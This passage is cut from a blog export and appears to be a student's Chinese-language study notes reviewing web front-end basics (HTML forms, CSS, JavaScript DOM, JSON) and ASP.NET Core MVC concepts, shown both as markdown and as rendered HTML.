16.控制器编程\n\n给出数据库表，以及模型类、数据库上下文类，查询所有记录或根据 id 查明细。控制器基本结构：\n\n```\npublic class MoviesController : Controller\n{\nprivate readonly MvcMovieContext _context;\npublic MoviesController(MvcMovieContext context)\n{\n_context = context;\n}\n// …CRUD操作\n}\n```","source":"_posts/NET.md","raw":"---\ntitle: .NET复习\ndate: 2023-03-12 23:27:39\nexcerpt: .NET复习\ncategories: 学习\n---\n\n# NET\n\n# 一.前端部分\n\n## 1.VScode 常用插件\n\n- `Live Server` **搭建具有实时加载功能的小型服务器**\n- `Open-In-Browser`**直接在浏览器中查看页面**\n- `HTML CSS Support`**HTML和CSS代码提示**\n- `CSS Peak`**追踪至样式表中CSS类和id定义的地方**\n- `Prettier-Code formatter`**代码格式化工具**\n- `JavaScript（ES6)CODE SNIPPETS`**支持ES6和JavaScript代码片段插件**\n- `Color Info`**CSS中使用颜色的相关信息**\n\n## \n\n## 2.HTML\n\n#### ◼html部分特殊符号\n\n| 显示结果 | &nbsp  |\n| :------: | :----: |\n|   空格   | &nbsp  |\n|    <     |  &lt   |\n|    >     |  &gt   |\n|    &     |  &amp  |\n|    £     | &pound |\n|    ¥     |  &yen  |\n|    ©     | &copy  |\n|    ®     |  &reg  |\n|    ™     | &trade |\n|    ×     | &times |\n\n#### ◼html表格基本结构\n\n```html\n    <table border=\"1\" width=\"600px\">\n        <caption>学生名单</caption>\n        <tr>\n            <th>学号</th>\n            <th>姓名</th>\n            <th>院系</th>\n            <th colspan=\"2\">操作</th>\n        </tr>\n        <tr>\n            <td>2021001</td>\n            <td>小明</td>\n            <td>计算机学院</td>\n            <td>编辑</td>\n            <td>删除</td>\n        </tr>\n    </table>\n```\n\n- 每个`tr`表示一行每个`th`代表这一行中的每个元素值（第一行）`td`代表这一行中的每个元素值(非第一行)\n- `colspan=3`表示这个一次包含3纵列\n- `rowspan=4`表示这个一次包含4行\n\n\n\n#### ◼form表单基本结构\n\n```html\n<form action=\"data.html\" method=\"get\">\n        用户名：<input type=\"text\" name=\"nusername\"\n        <br>\n        密码：<input type=\"password\" name=\"pwd\"><br/>\n        <input type=\"submit\" value=\"提交\"<br/>\n        <input type=\"reset\" value=\"重填\"\n</form>\n```\n\n- `http://127.0.0.1:5500/data.html?nusername=123&pwd=456`这里将值传入了data.html，值与值之间用**<u>&</u>**隔开\n- `action=xxxx.xxxx`表示将这分表单的数据传入**xxxx.xxxx**\n- `methon='get'`表示传入方法是`get`方法，同理还有`post`方法\n\n\n\n#### ◼一些form表单元素及其属性作用\n\n```html\n<form>\n        用户名：\n        <input type=\"text\" name=\"username\" value=\"liulei\" title=\"提示信息\"\n        <br/>\n        密码：\n        <input type=\"password\" name=\"pwd\" maxlength=\"8\" placeholder=\"长度8个字符\"\n</form>\n```\n\n- `name=\"username\"`表示将数据提交时url显示的参数名字是**username**\n- `value=liulei` 属性的值表示的是`输入框中显示的初始值`\n- `title=提示信息`鼠标移上去后会弹出“**<u>提示信息</u>**”\n- `maxlength=8`最大位数是8\n- `placeholder=\"长度8个字符\"`当没有输入时显示“**<u>长度8个字符</u>**”\n\n\n\n\n\n```html\n    <form>\n        专业特长：<br/>\n        <select name=\"master\" size=\"4\" multiple=\"multiple\">\n            <option value=\"0\">.NET</option>\n            <option value=\"1\">J2EE</option>\n            <option value=\"2\">Java</option>\n            <option value=\"3\">Android</option>\n            <option value=\"4\">C</option>\n        </select>\n    </form>\n```\n\n- `size` 属性规定下拉列表中可见选项的数目\n- `multiple=\"multiple\"`表示可以同时选择多个选项\n- `value`属性如果我们选择的是**JAVA**那么我传入的数据就是**master=2**\n\n\n\n```html\n<form >\n附件：<input type=\"file\" name=\"myfile\" accept=\"文件类型\">\n</form>\n```\n\n![图片](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png)\n\n\n\n\n\n```html\n<form>\n\t<input type=\"date\" name=\"mydate\">\n</form>\n```\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png)\n\n\n\n## 3.css\n\n#### ◼ CSS的一些单位\n\n![图片-1667485429884](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png)\n\n#### ◼常见选择器及优先级\n\n| 选择器                     | 10000 |\n| -------------------------- | ----- |\n| style（内联样式）          | 1000  |\n| id选择器                   | 100   |\n| 类选择器、属性选择器、伪类 | 10    |\n| 标签选择题、伪元素         | 1     |\n| 通配符                     | 0     |\n\n**一般来说：选择范围较大的级别较低**\n\n#### ◼CSS 的 2 个示例\n\n\n\n##### 1.悬浮变色、边框、阴影等效果\n\n```css\ndiv{\n\tbackground-color:lightgrey;\n\twidth:130px;\n\tborder-left:20px solid green /*做边框*/\n\tborder-radius:5px;/*圆角*/\n\tpadding:10px;\n\tmargin:30px;\n}\ndiv:hover{\n\tbackground-color:rgb(151,248,39);\n\tcursor:pointer;\n\tbox-shadow:3px 3px 5px 1px rgba(0,0,0.2);/*阴影*/\n}\n<div>武汉科技大学</div>\n```\n\n- `background-color`属性设置元素的背景颜色\n- `width`设置段落宽度\n- `border-left`设置左边框属性\n- `border-radius`添加圆角边框\n- `padding`内边距\n- `margin`外边距\n- `hover`选择鼠标指针浮动在其上的元素，并设置其样式\n- `cursor:pointer`网页浏览时用户鼠标指针的样式或图形形状为一只伸出食指的手\n- `box-shadow` 属性用于在元素的框架上添加阴影效果（ X 轴偏移量、Y 轴偏移量、模糊半径、扩散半径和颜色）\n\n\n\n##### 2.简单导航\n\n```html\n<ul class=\"nav\">\n\t<li><a href=\"#home\">主页</a></li>\n\t<li><a href=\"#news\">新闻</a></li>\n\t<li><a href=\"#contact\">联系</a></li>\n\t<li><a href=\"#about\">关于</a></li>\n</ul>\n```\n\n\n\n```css\nul.nav {\n\tlist-style-type: none;\n}\n.nav li {\n\tfloat: left;\n}\n.nav li a:link,\n.nav li a:visited {\n        display: block;\n        width: 120px;\n        text-align: center;\n        padding: 4px;\n        color: #fff;\n        background-color: #98bf21;\n        text-decoration: none;\n}\n.nav li a:hover,\n.nav li a:active {\n    background-color: #7a991a;\n}\n```\n\n- `float:left`把图像像左浮动\n- `list-style-type`设置列表样式类型\n- `a:link`正常，未访问过的链接\n- `a:visited`用户已访问过的链接\n- `display:block`设置为块级元素\n- `text-align`设置文本对齐方式\n- `text-decoration`文本修饰\n\n## 4.JavaScript\n\n\n\n#### ◼ js基本特点\n\n- JS是一种**<u>解释性脚本语言</u>**（代码不进行预编译，可在程序运行过程中逐行进行解释）\n- JS是一种**<u>简单的弱类型脚本语</u>**言（未使用严格的数据类型\n- JS是一种**<u>基于对象的语言</u>**（不仅可以创建对象，也能使用自身的对象或其他语言创建的对象）\n- JS是一种**<u>跨平台脚本语言</u>**（不依赖于操作系统，仅需要浏览器的支持）\n\n#### ◼JS箭头函数\n\n**匿名函数可进一步用箭头函数来简化（箭头函数用`=>`定义，也成：lambda表达式**\n\n```js\nlet foo=function(num){\n    return num+1;\n}\nlet a=foo(100);\n\n//使用箭头函数\n\nlet foo =(num)=>num+1;\n```\n\n **JS 数组操作：map、reduce、join、slice、splice、push、pop、shift、unshift 方法基本用法**\n\n\n\n**JS 程序：五秒倒计时，跳转到学校官网**\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <button id=\"ok\">3秒后确定</button>\n</body>\n</html>\n<script>\n    let btn=document.getElementById(\"ok\");\n    btn.disabled=true;\n    let t=3;\n    function count(){\n        t--;\n        btn.innerHTML=t+\"秒后确定\";\n        if(t<=0){\n            clearInterval(id);\n            btn.disabled=false;\n            btn.innerHTML=\"确定\";\n            let url=window.location;\n            window.loaction=\"https://www.wust.edu.cn\"\n        }\n    }\n    let id = setInterval(count,1000);\n</script>\n```\n\n- `document.getElementById`方法可返回对拥有指定 ID 的第一个对象的引用\n- `btn.disabled`禁用\n- `btn.innerHTML` 属性设置或返回表格行的开始和结束标签之间的 HTML。\n- `setInterval`方法可按照指定的周期（以毫秒计）来调用函数或计算表达式\n- `clearInterval`方法可取消由 setInterval() 函数设定的定时执行操作\n- `window.loaction`页面跳转\n\n#### ◼DOM基本概念\n\n**DOM:文档对象模型**\n\n**DOM是载入到浏览器中的文档模型，以节点树的形式来表现文档，每个节点代表文档的构成部分**\n\n\n\n#### ◼DOM常用操作\n\n##### 1.查询操作\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.getElementById('list') // 命中id=\"list\"的元素，注意不带#，不是css选择器\nconsole.log(list.innerHTML) //查看元素的HTML内容\nlet first = document.querySelector('.item') // 命中第一个 class=\"item\" 参数为class选择器\nconsole.log(first.innerHTML)\nlet second = document.querySelector('.item:nth-child(2)') // 命中第二个 .item 复杂的css选择器\nconsole.log(second.innerHTML)\nlet items = document.querySelectorAll('.item') // 获得包含所有 .item 的集合（NodeList）\nconsole.log(items.length) //查看集合长度\nfor ( let el of items ) { //遍历集合\nconsole.log(el)\n}\n```\n\n##### 2.创建操作：document.createElement\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.createElement('ul') //创建1个ul元素\nlist.id = 'list' // 设置元素的id属性\nfor ( let i = 0; i < 3; i++ ) {\nlet item = document.createElement('li') //循环创建3个li元素\nitem.className = 'item' // 设置元素的class属性\nitem.innerText = `${i + 1}` // 设置元素的innerText属性 (使用了模板字符串)\nlist.appendChild(item) // 将创建好的元素添加到父节点\n}\n// 将list添加到body\ndocument.body.appendChild(list)\n```\n\n#### JSON对象定义基本特点\n\n- **<u>数据在键值对中（键名即属性名必须加双引号）</u>**\n- **<u>数据由逗号分隔</u>**\n- **<u>花括号保存对象</u>**\n- **<u>方括号保存数组</u>**\n\n**JSON可通过JavaScript进行解析，JSON的值可以是：数字 字符串 逻辑值 数组 对象 null**\n\n**json不能存储Date对象，如果需要则用字符串表示**\n\n\n\n#### JSON.parse程序示例：\n\n**◼ JSON.parse(text [, reviver]) ：将JSON格式字符串转换为JavaScript对象**\n\n**◼ 参数说明：**\n\n- `text`：必需，一个有效的JSON字符串 (如格式不正确则解析会出错)\n- `reviver`：可选，一个转换结果的函数， 将为对象的每个成员调用此函数\n\n```js\nlet jstr = '{\"name\":\"wust\", \"url\":\"www.wust.edu.cn\",\"birthday\":\"1898-11-21\"}';\nlet obj = JSON.parse( jstr, function(key, value) {\n\tif (key == \"birthday\") {\n\t\tlet diff = new Date() - new Date(value); //计算距今的毫秒数\n\t\tlet year = parseInt(diff / 1000 / 60 / 60 / 24 / 365); //相差的年数\n\t\treturn year;\n\t}else{\n        return value;\n    }\n})\nconsole.log(jsonObj.birthday);\n```\n\n# 二.MVC后台部分\n\n#### 1.MVC基本概念：\n\n- MVC:是一种体系结构模式，他将应用程序分成3个主要组件：**<u>模型（Model）视图（View）和控制器（Controller）</u>**\n- MVC模式有助于实现关注点分离：\n- 关注点：**输入逻辑** **业务逻辑** **UI逻辑**\n\n#### 2.MVC三个模块功能\n\n- 控制器C：处理浏览器的请求，决定如何调用业务层数据的增、删、改、查等业务操作，以及如何将结果返回给视图进行渲染。\n- 模型M：应用的实体类，用于在内存中暂时存储数据，并在数据变化时通知控制器。\n- 视图V：主要用来解析、处理、显示内容，并进行模板的渲染。\n\n#### 3.MVC体系结构优点：\n\n◼ Controller与View完全分离(松耦合)，有利于前、后台分工合作\n\n◼ 一个Model可建立多个视图，满足用户不同需求\n\n◼ Model独立于视图，可移植到新的平台，代码重用高，易于维护\n\n◼ 表现层的性能可以优化到极致\n\n◼ 容易对界面逻辑进行单元测试\n\n◼ 非常强大的URL映射组件，非常干净的URL来建造应用\n\n◼ 有利于软件工程化管理\n\n#### 4.MVC项目目录结构\n\n![图片-1667485456621](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png)\n\n#### 5.Razor基本概念和基本语法规则\n\n`Razor概念`Razor是一个视图模板引擎，它提供了优雅的方法将基于服务器的代码（如C#）嵌入到HTML页面中\n\n`Razor语法规则`\n\n◼ C# 代码封装于 @{ ... } 中\n\n◼ 代码语句以分号结尾\n\n◼ 行内表达式（变量和函数）以 @ 开头\n\n◼ C# 代码对大小写敏感\n\n#### 6.ViewData传值特点\n\n- ViewData是一个字典对象，用来从Controller向对应的View视图传值\n- ViewData只在当前请求中有效，生命周期和View相同，其值不能在多个请求中共享\n- 在重定向(新请求)后，ViewData存储的值将变为null\n- 使用ViewData值时必须进行合适的类型转换和建议空值检查\n\n#### 7.TrmpData传值特点\n\n- TempData也是一个字典对象，但是基于Session存储机制\n- TempData用在多个Action间或页面重定向(Redirection)时传递共享数据\n- 但TempData存放的数据只一次访问中有效，一次访问完成后就会删除\n- TempData用法和ViewData相同\n\n#### 8.“新搭建基架的项目”时生成的一些内容：\n\n![图片-1667485469907](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png)\n\n#### 9.EF Core数据库迁移两个命令：\n\n① **<u>Add-Migration InitialCreate</u>**\n\n② **<u>Uppate-Database</u>**\n\n#### 10.ORM的概念\n\n> ORM (Object Relation Mapping) 是对象/关系映射，它将内存中的对象和数据库中的立映射关系\n\n#### 11.ORM技术产生的背景原因\n\n◼ 面向对象开发方法是当今企业级应用主流开发方法。\n\n◼ 关系数据库是企业级应用永久存放数据的主流数据存储系统。\n\n◼ 对象和关系数据是业务实体两种表现形式：业务实体在内存中表现为对象(非持久化存储)，在数据库中表\n\n现为关系数据(持久化存储) 。\n\n◼ 需要一种技术实现二者间映射，以简化编程，提高系统效率 \n\n#### 12.模型的一些DateType注解\n\n|     DataType类型值      |       说明       |\n| :---------------------: | :--------------: |\n|    DataType.Currency    |    表示货币值    |\n|      DataType.Date      |    表示日期值    |\n|  DataType.EmailAddress  | 表示电子邮件地址 |\n| DataType.Multiline Text |   表示多行文本   |\n|    DataType.Password    |    表示密码值    |\n|      DataType.Time      |    表示时间值    |\n|      DataType.Url       |  表示一个URL值   |\n\n#### 13.模型的一些验证注解\n\n◼ `[Required]`：验证字段是否不为 null\n\n◼ `[StringLength]`：验证字符串属性值是否不超过指定的长度限制。\n\n◼ `[Range]`：验证属性值是否位于指定范围内。\n\n◼ `[Compare]`：验证模型中的两个属性是否匹配。\n\n◼ `[RegularExpression]`：验证 属性值是否与指定的正则表达式匹配。\n\n◼ `[EmailAddress]`：验证属性是否具有电子邮件格式。\n\n注：`[DataType]`：只是帮助字段进行格式设置，不提供任何验证\n\n#### 14.控制器方法的两个注解\n\n◼ `[HttpPost] 注解：`表明只能由POST请求才能调用此Action方法，不写默认[HttpGet] (第一个Create就是GET)\n\n◼ `[ValidateAntiForgeryToken] 注解：`用于防止请求伪造 (更安全)\n\n#### 15.强类型传值\n\n◼ 回顾：ViewData字典传值是一个弱类型传值方式 (使用时需要手工强转类型)\n\n◼ 强类型传值则不需要手工强转类型\n\n◼ 如何实现强类型传值：\n\n\t\t① 控制器在返回视图时，添加模型对象作为参数，即： return View(模型对象); \n\t\n\t\t② 在视图中，先使用 @model 指令声明模型对象类型\n\t\n\t\t③ 然后在视图中使用Model对象来接收传来的模型对象，之后使用Model对象无需强转\n\n#### 16.控制器编程\n\n给出数据库表，以及模型类、数据库上下文类，查询所有记录或根据 id 查明细。控制器基本结构：\n\n```\npublic class MoviesController : Controller\n{\nprivate readonly MvcMovieContext _context;\npublic MoviesController(MvcMovieContext context)\n{\n_context = context;\n}\n// …CRUD操作\n}\n```","slug":"NET","published":1,"updated":"2024-04-17T08:43:00.239Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7i90004h776638ueyi2","content":"<h1 id=\"NET\"><a href=\"#NET\" class=\"headerlink\" title=\"NET\"></a>NET</h1><h1 id=\"一-前端部分\"><a href=\"#一-前端部分\" class=\"headerlink\" title=\"一.前端部分\"></a>一.前端部分</h1><h2 id=\"1-VScode-常用插件\"><a href=\"#1-VScode-常用插件\" class=\"headerlink\" title=\"1.VScode 常用插件\"></a>1.VScode 常用插件</h2><ul>\n<li><code>Live Server</code> <strong>搭建具有实时加载功能的小型服务器</strong></li>\n<li><code>Open-In-Browser</code><strong>直接在浏览器中查看页面</strong></li>\n<li><code>HTML CSS Support</code><strong>HTML和CSS代码提示</strong></li>\n<li><code>CSS Peak</code><strong>追踪至样式表中CSS类和id定义的地方</strong></li>\n<li><code>Prettier-Code formatter</code><strong>代码格式化工具</strong></li>\n<li><code>JavaScript（ES6)CODE SNIPPETS</code><strong>支持ES6和JavaScript代码片段插件</strong></li>\n<li><code>Color Info</code><strong>CSS中使用颜色的相关信息</strong></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"2-HTML\"><a href=\"#2-HTML\" class=\"headerlink\" title=\"2.HTML\"></a>2.HTML</h2><h4 id=\"◼html部分特殊符号\"><a href=\"#◼html部分特殊符号\" class=\"headerlink\" title=\"◼html部分特殊符号\"></a>◼html部分特殊符号</h4><table>\n<thead>\n<tr>\n<th align=\"center\">显示结果</th>\n<th align=\"center\">&amp;nbsp</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">空格</td>\n<td align=\"center\">&amp;nbsp</td>\n</tr>\n<tr>\n<td align=\"center\">&lt;</td>\n<td align=\"center\">&amp;lt</td>\n</tr>\n<tr>\n<td align=\"center\">&gt;</td>\n<td align=\"center\">&amp;gt</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;</td>\n<td align=\"center\">&amp;amp</td>\n</tr>\n<tr>\n<td align=\"center\">£</td>\n<td align=\"center\">&amp;pound</td>\n</tr>\n<tr>\n<td align=\"center\">¥</td>\n<td align=\"center\">&amp;yen</td>\n</tr>\n<tr>\n<td align=\"center\">©</td>\n<td align=\"center\">&amp;copy</td>\n</tr>\n<tr>\n<td align=\"center\">®</td>\n<td align=\"center\">&amp;reg</td>\n</tr>\n<tr>\n<td align=\"center\">™</td>\n<td align=\"center\">&amp;trade</td>\n</tr>\n<tr>\n<td align=\"center\">×</td>\n<td align=\"center\">&amp;times</td>\n</tr>\n</tbody></table>\n<h4 id=\"◼html表格基本结构\"><a href=\"#◼html表格基本结构\" class=\"headerlink\" title=\"◼html表格基本结构\"></a>◼html表格基本结构</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">border</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;600px&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">caption</span>&gt;</span>学生名单<span class=\"tag\">&lt;/<span class=\"name\">caption</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>学号<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>姓名<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>院系<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">colspan</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>操作<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>2021001<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>小明<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>计算机学院<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>编辑<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>删除<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>每个<code>tr</code>表示一行每个<code>th</code>代表这一行中的每个元素值（第一行）<code>td</code>代表这一行中的每个元素值(非第一行)</li>\n<li><code>colspan=3</code>表示这个一次包含3纵列</li>\n<li><code>rowspan=4</code>表示这个一次包含4行</li>\n</ul>\n<h4 id=\"◼form表单基本结构\"><a href=\"#◼form表单基本结构\" class=\"headerlink\" title=\"◼form表单基本结构\"></a>◼form表单基本结构</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;data.html&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;get&quot;</span>&gt;</span></span><br><span class=\"line\">        用户名：<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;nusername&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>&gt;</span></span><br><span class=\"line\">        密码：<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;提交&quot;</span>&lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;reset&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;重填&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>http://127.0.0.1:5500/data.html?nusername=123&amp;pwd=456</code>这里将值传入了data.html，值与值之间用**<u>&amp;</u>**隔开</li>\n<li><code>action=xxxx.xxxx</code>表示将这分表单的数据传入<strong>xxxx.xxxx</strong></li>\n<li><code>methon=&#39;get&#39;</code>表示传入方法是<code>get</code>方法，同理还有<code>post</code>方法</li>\n</ul>\n<h4 id=\"◼一些form表单元素及其属性作用\"><a href=\"#◼一些form表单元素及其属性作用\" class=\"headerlink\" title=\"◼一些form表单元素及其属性作用\"></a>◼一些form表单元素及其属性作用</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">        用户名：</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;liulei&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;提示信息&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        密码：</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span> <span class=\"attr\">maxlength</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;长度8个字符&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>name=&quot;username&quot;</code>表示将数据提交时url显示的参数名字是<strong>username</strong></li>\n<li><code>value=liulei</code> 属性的值表示的是<code>输入框中显示的初始值</code></li>\n<li><code>title=提示信息</code>鼠标移上去后会弹出“**<u>提示信息</u>**”</li>\n<li><code>maxlength=8</code>最大位数是8</li>\n<li><code>placeholder=&quot;长度8个字符&quot;</code>当没有输入时显示“**<u>长度8个字符</u>**”</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    专业特长：<span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;master&quot;</span> <span class=\"attr\">size</span>=<span class=\"string\">&quot;4&quot;</span> <span class=\"attr\">multiple</span>=<span class=\"string\">&quot;multiple&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span>.NET<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span>&gt;</span>J2EE<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>Java<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;3&quot;</span>&gt;</span>Android<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span>C<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>size</code> 属性规定下拉列表中可见选项的数目</li>\n<li><code>multiple=&quot;multiple&quot;</code>表示可以同时选择多个选项</li>\n<li><code>value</code>属性如果我们选择的是<strong>JAVA</strong>那么我传入的数据就是<strong>master&#x3D;2</strong></li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> &gt;</span></span><br><span class=\"line\">附件：<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;myfile&quot;</span> <span class=\"attr\">accept</span>=<span class=\"string\">&quot;文件类型&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       